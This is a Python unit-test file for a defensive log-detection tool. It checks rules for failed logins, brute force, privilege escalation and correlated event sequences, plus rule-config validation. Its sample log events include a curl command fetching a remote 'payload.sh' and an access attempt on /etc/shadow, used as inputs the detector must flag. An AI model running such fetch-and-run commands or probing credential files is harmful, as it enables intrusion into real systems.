import importlib.util
import json
import unittest
from datetime import datetime, timedelta
from pathlib import Path
from tempfile import TemporaryDirectory

from logcheck.config import config_to_dict, default_config, load_config
from logcheck.models import DetectionConfig, Event
from logcheck.rules import detect_findings


class RuleTests(unittest.TestCase):
    def test_keyword_rule_detects_failed_login(self):
        event = Event(
            source_file="auth.log",
            line_number=1,
            raw_line="Failed password for invalid user admin from 192.0.2.10",
            category="auth",
            actor="admin",
            source_address="192.0.2.10",
            message="Failed password for invalid user admin from 192.0.2.10",
        )
        findings = detect_findings([event], default_config())
        self.assertTrue(any(f.rule_id == "keyword.failed_login" for f in findings))

    def test_repeated_failed_login_detects_brute_force(self):
        events = [
            Event(
                "auth.log",
                i,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            )
            for i in range(1, 6)
        ]
        findings = detect_findings(events, default_config())
        brute_force = [f for f in findings if f.rule_id == "correlation.brute_force"]
        self.assertEqual(len(brute_force), 1)
        self.assertEqual(brute_force[0].severity, "high")
        self.assertEqual(brute_force[0].count, 5)

    def test_repeated_failed_logins_do_not_create_multi_signal_finding(self):
        events = [
            Event(
                "auth.log",
                i,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            )
            for i in range(1, 6)
        ]

        findings = detect_findings(events, default_config())

        self.assertFalse(
            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
        )

    def test_custom_threshold_is_applied(self):
        config = DetectionConfig(keywords=default_config().keywords, brute_force_threshold=2)
        events = [
            Event(
                "auth.log",
                1,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            ),
            Event(
                "auth.log",
                2,
                "Failed password",
                category="auth",
                source_address="192.0.2.10",
                message="Failed password",
            ),
        ]
        findings = detect_findings(events, config)
        self.assertTrue(any(f.rule_id == "correlation.brute_force" for f in findings))

    def test_suspicious_command_finding_includes_reasons(self):
        events = [
            Event(
                source_file="app.log",
                line_number=1,
                raw_line="user ran curl http://198.51.100.7/payload.sh",
                category="command",
                actor="alice",
                source_address="192.0.2.10",
                message="curl http://198.51.100.7/payload.sh",
            )
        ]

        findings = detect_findings(events, default_config())

        suspicious = [finding for finding in findings if finding.rule_id.startswith("behavior.")]
        self.assertTrue(suspicious)
        self.assertIsNotNone(suspicious[0].severity_reason)
        self.assertIsNotNone(suspicious[0].confidence_reason)

    def test_sudo_failure_creates_privilege_escalation_finding(self):
        event = Event(
            source_file="auth.log",
            line_number=1,
            raw_line="Jun  2 10:03:01 ubuntu sudo: pam_unix(sudo:auth): authentication failure; user=root",
            category="auth",
            actor="root",
            message="pam_unix(sudo:auth): authentication failure; user=root",
        )

        findings = detect_findings([event], default_config())

        privilege = [
            finding
            for finding in findings
            if finding.rule_id == "behavior.privilege_escalation"
        ]
        self.assertEqual(len(privilege), 1)
        self.assertEqual(privilege[0].severity, "high")
        self.assertIn("Privilege escalation", privilege[0].explanation)
        self.assertEqual(privilege[0].line_number, 1)
        self.assertIsNotNone(privilege[0].severity_reason)
        self.assertIsNotNone(privilege[0].confidence_reason)

    def test_sensitive_path_creates_privilege_escalation_finding(self):
        event = Event(
            source_file="app.log",
            line_number=2,
            raw_line="2026-06-02 10:04:00 ERROR permission denied user=guest ip=198.51.100.7 path=/etc/shadow",
            category="application",
            actor="guest",
            source_address="198.51.100.7",
            message="permission denied user=guest ip=198.51.100.7 path=/etc/shadow",
        )

        findings = detect_findings([event], default_config())

        self.assertTrue(
            any(
                finding.rule_id == "behavior.privilege_escalation"
                for finding in findings
            )
        )

    def test_multi_signal_actor_creates_correlated_behavior_finding(self):
        events = [
            Event(
                "auth.log",
                1,
                "Failed password for root from 192.0.2.10",
                category="auth",
                actor="root",
                source_address="192.0.2.10",
                message="Failed password",
            ),
            Event(
                "auth.log",
                2,
                "Invalid user admin from 192.0.2.10",
                category="auth",
                actor="admin",
                source_address="192.0.2.10",
                message="Invalid user",
            ),
        ]

        findings = detect_findings(events, default_config())

        self.assertTrue(
            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
        )

    def test_single_suspicious_command_does_not_create_multi_signal_finding(self):
        event = Event(
            source_file="app.log",
            line_number=1,
            raw_line="user ran curl http://198.51.100.7/payload.sh",
            category="command",
            actor="alice",
            source_address="192.0.2.10",
            message="curl http://198.51.100.7/payload.sh",
        )

        findings = detect_findings([event], default_config())

        self.assertFalse(
            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
        )

    def test_template_burst_detects_repeated_variable_suspicious_events(self):
        config = DetectionConfig(
            keywords=default_config().keywords,
            template_burst_threshold=3,
        )
        events = [
            Event(
                "app.log",
                i,
                f"2026-06-10 ERROR unauthorized access user=guest ip=192.0.2.{i} path=/admin/{i}",
                category="application",
                actor="guest",
                source_address="192.0.2.10",
                message=f"unauthorized access user=guest ip=192.0.2.{i} path=/admin/{i}",
            )
            for i in range(1, 4)
        ]

        findings = detect_findings(events, config)
        burst = [
            finding for finding in findings if finding.rule_id == "behavior.template_burst"
        ]

        self.assertEqual(len(burst), 1)
        self.assertEqual(burst[0].count, 3)
        self.assertEqual(burst[0].source_address, "192.0.2.10")
        self.assertIn("unauthorized access", burst[0].explanation.lower())
        self.assertIsNotNone(burst[0].severity_reason)
        self.assertIsNotNone(burst[0].confidence_reason)
        self.assertEqual(len(burst[0].evidence), 3)

    def test_template_burst_ignores_repeated_events_below_threshold(self):
        config = DetectionConfig(
            keywords=default_config().keywords,
            template_burst_threshold=4,
        )
        events = [
            Event(
                "app.log",
                i,
                f"2026-06-10 ERROR unauthorized access user=guest ip=192.0.2.{i} path=/admin/{i}",
                category="application",
                actor="guest",
                source_address="192.0.2.10",
                message=f"unauthorized access user=guest ip=192.0.2.{i} path=/admin/{i}",
            )
            for i in range(1, 4)
        ]

        findings = detect_findings(events, config)

        self.assertFalse(
            any(finding.rule_id == "behavior.template_burst" for finding in findings)
        )

    def test_auth_to_privilege_sequence_creates_correlated_finding(self):
        start = datetime(2026, 6, 10, 10, 0, 0)
        config = DetectionConfig(
            keywords=default_config().keywords,
            sequence_window_minutes=10,
        )
        events = [
            Event(
                "auth.log",
                1,
                "Jun 10 10:00:00 host sshd[1]: Failed password for admin from 192.0.2.10 port 22 ssh2",
                timestamp=start,
                category="auth",
                source_address="192.0.2.10",
                actor="admin",
                message="Failed password for admin from 192.0.2.10",
            ),
            Event(
                "auth.log",
                2,
                "Jun 10 10:03:00 host sudo: pam_unix(sudo:auth): authentication failure; user=root",
                timestamp=start + timedelta(minutes=3),
                category="auth",
                source_address="192.0.2.10",
                actor="admin",
                target="root",
                message="sudo:auth authentication failure user=root",
            ),
        ]

        findings = detect_findings(events, config)
        sequence = [
            finding
            for finding in findings
            if finding.rule_id == "behavior.auth_to_privilege_sequence"
        ]

        self.assertEqual(len(sequence), 1)
        self.assertEqual(sequence[0].source_address, "192.0.2.10")
        self.assertEqual(sequence[0].count, 2)
        self.assertEqual(len(sequence[0].evidence), 2)
        self.assertIsNotNone(sequence[0].severity_reason)
        self.assertIsNotNone(sequence[0].confidence_reason)

    def test_auth_to_privilege_sequence_respects_window(self):
        start = datetime(2026, 6, 10, 10, 0, 0)
        config = DetectionConfig(
            keywords=default_config().keywords,
            sequence_window_minutes=10,
        )
        events = [
            Event(
                "auth.log",
                1,
                "Failed password for admin from 192.0.2.10",
                timestamp=start,
                category="auth",
                source_address="192.0.2.10",
                actor="admin",
                message="Failed password for admin from 192.0.2.10",
            ),
            Event(
                "auth.log",
                2,
                "sudo:auth authentication failure user=root",
                timestamp=start + timedelta(minutes=30),
                category="auth",
                source_address="192.0.2.10",
                actor="admin",
                target="root",
                message="sudo:auth authentication failure user=root",
            ),
        ]

        findings = detect_findings(events, config)

        self.assertFalse(
            any(
                finding.rule_id == "behavior.auth_to_privilege_sequence"
                for finding in findings
            )
        )

    def test_json_rule_file_is_loaded(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(
                json.dumps(
                    {
                        "keywords": {"custom_rule": ["needle"]},
                        "brute_force": {"threshold": 3, "window_minutes": 7},
                    }
                ),
                encoding="utf-8",
            )

            config = load_config(path)

        self.assertEqual(config.keywords, {"custom_rule": ["needle"]})
        self.assertEqual(config.brute_force_threshold, 3)
        self.assertEqual(config.brute_force_window_minutes, 7)
        self.assertEqual(
            config_to_dict(config),
            {
                "keywords": {"custom_rule": ["needle"]},
                "brute_force": {"threshold": 3, "window_minutes": 7},
                "behavior": {
                    "enabled": True,
                    "template_burst_threshold": 4,
                    "sequence_window_minutes": 10,
                },
            },
        )

    def test_config_to_dict_can_be_reloaded_from_json(self):
        original = DetectionConfig(
            keywords={"custom_rule": ["needle", "signal"]},
            brute_force_threshold=4,
            brute_force_window_minutes=12,
        )
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(json.dumps(config_to_dict(original)), encoding="utf-8")

            reloaded = load_config(path)

        self.assertEqual(reloaded, original)

    def test_behavior_rule_config_is_loaded(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(
                json.dumps(
                    {
                        "behavior": {
                            "enabled": True,
                            "template_burst_threshold": 3,
                            "sequence_window_minutes": 15,
                        }
                    }
                ),
                encoding="utf-8",
            )

            config = load_config(path)

        self.assertTrue(config.behavior_enabled)
        self.assertEqual(config.template_burst_threshold, 3)
        self.assertEqual(config.sequence_window_minutes, 15)

    def test_behavior_config_to_dict_can_be_reloaded_from_json(self):
        original = DetectionConfig(
            keywords={"custom_rule": ["needle"]},
            brute_force_threshold=4,
            brute_force_window_minutes=12,
            behavior_enabled=True,
            template_burst_threshold=3,
            sequence_window_minutes=15,
        )
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(json.dumps(config_to_dict(original)), encoding="utf-8")

            reloaded = load_config(path)

        self.assertEqual(reloaded, original)

    def test_rule_config_rejects_invalid_behavior_values(self):
        cases = [
            {"enabled": "yes"},
            {"template_burst_threshold": True},
            {"template_burst_threshold": 0},
            {"template_burst_threshold": 2.5},
            {"sequence_window_minutes": False},
            {"sequence_window_minutes": 0},
            {"sequence_window_minutes": 7.5},
        ]
        for behavior in cases:
            with self.subTest(behavior=behavior):
                with TemporaryDirectory() as tmp:
                    path = Path(tmp) / "rules.json"
                    path.write_text(json.dumps({"behavior": behavior}), encoding="utf-8")

                    with self.assertRaises(ValueError):
                        load_config(path)

    def test_rule_config_rejects_unsupported_behavior_fields(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(
                json.dumps({"behavior": {"template_burst_threshold": 3, "mode": "remote"}}),
                encoding="utf-8",
            )

            with self.assertRaises(ValueError):
                load_config(path)

    def test_yaml_rule_file_is_loaded_when_yaml_is_available(self):
        if importlib.util.find_spec("yaml") is None:
            self.skipTest("PyYAML is not installed")
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.yaml"
            path.write_text(
                "keywords:\n  custom_rule:\n    - needle\nbrute_force:\n  threshold: 2\n  window_minutes: 6\n",
                encoding="utf-8",
            )

            config = load_config(path)

        self.assertEqual(config.keywords, {"custom_rule": ["needle"]})
        self.assertEqual(config.brute_force_threshold, 2)
        self.assertEqual(config.brute_force_window_minutes, 6)

    def test_malformed_yaml_rule_file_raises_value_error_when_yaml_is_available(self):
        if importlib.util.find_spec("yaml") is None:
            self.skipTest("PyYAML is not installed")
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.yaml"
            path.write_text("keywords:\n  custom_rule:\n    - [needle\n", encoding="utf-8")

            with self.assertRaises(ValueError):
                load_config(path)

    def test_rule_config_rejects_invalid_keyword_shape(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(json.dumps({"keywords": {"bad": "needle"}}), encoding="utf-8")

            with self.assertRaises(ValueError):
                load_config(path)

    def test_rule_config_rejects_invalid_brute_force_shape(self):
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "rules.json"
            path.write_text(json.dumps({"brute_force": "bad"}), encoding="utf-8")

            with self.assertRaises(ValueError):
                load_config(path)

    def test_rule_config_rejects_non_integer_brute_force_values(self):
        cases = [
            {"threshold": True},
            {"threshold": 3.5},
            {"window_minutes": False},
            {"window_minutes": 7.5},
        ]
        for brute_force in cases:
            with self.subTest(brute_force=brute_force):
                with TemporaryDirectory() as tmp:
                    path = Path(tmp) / "rules.json"
                    path.write_text(json.dumps({"brute_force": brute_force}), encoding="utf-8")

                    with self.assertRaises(ValueError):
                        load_config(path)


if __name__ == "__main__":
    unittest.main()
